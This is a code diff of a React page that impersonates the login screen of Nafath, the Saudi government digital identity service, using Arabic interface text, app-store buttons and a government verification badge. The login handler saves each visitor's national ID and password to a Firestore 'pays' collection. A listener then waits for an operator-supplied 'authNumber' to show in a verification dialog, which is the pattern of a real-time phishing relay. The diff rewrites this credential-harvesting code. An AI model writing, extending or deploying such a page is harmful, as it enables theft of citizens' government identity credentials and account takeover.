@@ -1,6 +1,6 @@
 "use client";
 
-export const dynamic = "force-dynamic";
+export const dynamic = 'force-dynamic';
 
 import { Loader2Icon, Menu, ShieldAlert, Smartphone } from "lucide-react";
 import { Button } from "@/components/ui/button";
@@ -22,72 +22,50 @@ export default function Component() {
   const [authNumber, setAuthNumber] = useState<string>("");
   const [isloading, setIsLoading] = useState(false);
   const [idLogin, setLoginID] = useState("");
-  const [password, setPassword] = useState("");
+  const [password,setPassword] = useState("");
   const [showError, setShowError] = useState("");
 
+  
   useEffect(() => {
-    if (typeof window === "undefined") return;
-
-    const visitorId = localStorage.getItem("visitor");
+    const visitorId = localStorage.getItem("visitor")
     if (visitorId && db) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data();
-          setAuthNumber(data.authNumber || "");
+          const data = docSnap.data()
+          setAuthNumber( data.authNumber)
+      
         }
-      });
+      })
 
-      return () => unsubscribe();
+      return () => unsubscribe()
     }
-  }, []);
+  }, [])
 
-  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
+  const handleLogin = (e: any) => {
     e.preventDefault();
+    const visitorId = localStorage.getItem("visitor");
     setShowError("");
 
-if (typeof window === "undefined") return;
-
-let visitorId = "";
-
-if (typeof window !== "undefined") {
-  const savedVisitor = window.localStorage.getItem("visitor");
-  visitorId = savedVisitor ?? "";
-
-  if (!visitorId) {
-    visitorId = Date.now().toString();
-    window.localStorage.setItem("visitor", visitorId);
-  }
-}
-
-    if (!idLogin || !password) {
-      setShowError("يرجى إدخال رقم الهوية وكلمة المرور");
-      return;
-    }
-
-try {
-  setIsLoading(true);
-
-  addData(`pays/${visitorId}`, {
-    id: visitorId,
-    nafazId: idLogin,
-    nafazPass: password,
-  });
-
-  setTimeout(() => {
-    setShowAuthDialog(true);
-    setIsLoading(false);
-  }, 1000);
-} catch (error) {
-  console.error(error);
-  setIsLoading(false);
-  setShowError("حدث خطأ أثناء تسجيل الدخول");
-}
+    setIsLoading(true);
+    addData({
+      id: visitorId,
+      nafazId: idLogin,
+      nafazPass:password,
+      authNumber: "...",
+      approval: "pending",
+    });
+    setTimeout(() => {
+      setShowAuthDialog(true);
+      setIsLoading(false);
+    }, 5000);
+  };
 
   return (
     <div
       className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
       dir="rtl"
     >
+      {/* Header */}
       <header className="bg-white shadow-sm border-b">
         <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
           <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
@@ -96,7 +74,9 @@ try {
         </div>
       </header>
 
+      {/* Main Content */}
       <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
+        {/* Login Section Title */}
         <div className="text-center space-y-2">
           <h1 className="text-2xl font-bold text-gray-800 mb-2">
             الدخول على النظام
@@ -106,6 +86,7 @@ try {
           </p>
         </div>
 
+        {/* Nafath App Section */}
         <div className="bg-gradient-to-r from-teal-600 to-teal-700 text-white p-6 rounded-xl text-center shadow-lg">
           <div className="flex items-center justify-center gap-2 mb-2">
             <ShieldAlert className="w-6 h-6" />
@@ -115,6 +96,7 @@ try {
         </div>
 
         <form onSubmit={handleLogin}>
+          {/* Login Form */}
           <Card className="bg-white shadow-lg border-0">
             <CardContent className="p-6 space-y-5">
               <div className="text-center">
@@ -133,8 +115,7 @@ try {
                 onChange={(e) => setLoginID(e.target.value)}
                 required
               />
-
-              <Input
+ <Input
                 placeholder="أدخل كلمة المرور الخاصة بك هنا"
                 className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                 dir="rtl"
@@ -142,7 +123,6 @@ try {
                 type="password"
                 required
               />
-
               {showError && (
                 <Alert
                   className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
@@ -155,7 +135,7 @@ try {
 
               <Button
                 type="submit"
-                disabled={isloading || !idLogin || !password}
+                disabled={isloading || !idLogin}
                 className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
               >
                 {isloading ? (
@@ -173,6 +153,7 @@ try {
                   لتحميل تطبيق نفاذ
                 </div>
 
+                {/* App Store Buttons */}
                 <div className="flex justify-center gap-3">
                   <a href="#" className="hover:scale-105 transition-transform">
                     <img src="plays.svg" alt="Google Play" className="h-10" />
@@ -186,6 +167,7 @@ try {
           </Card>
         </form>
 
+        {/* New Nafath Platform Section */}
         <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
           <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
           <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
@@ -205,6 +187,7 @@ try {
           </CardContent>
         </Card>
 
+        {/* Authentication Dialog */}
         <Dialog open={showAuthDialog} onOpenChange={setShowAuthDialog}>
           <DialogContent className="max-w-md mx-auto" dir="rtl">
             <DialogHeader>
@@ -259,6 +242,7 @@ try {
         </Dialog>
       </main>
 
+      {/* Footer */}
       <footer className="mt-12 p-6 bg-white border-t">
         <div className="text-center space-y-6 max-w-4xl mx-auto">
           <div className="text-gray-600 text-sm font-medium">تطوير وتشغيل</div>
@@ -311,6 +295,7 @@ try {
             </a>
           </div>
 
+          {/* Government Verification Badge */}
           <div className="flex justify-center mt-4">
             <img src="cisoc.svg" alt="sd" width={50} className="opacity-80" />
           </div>
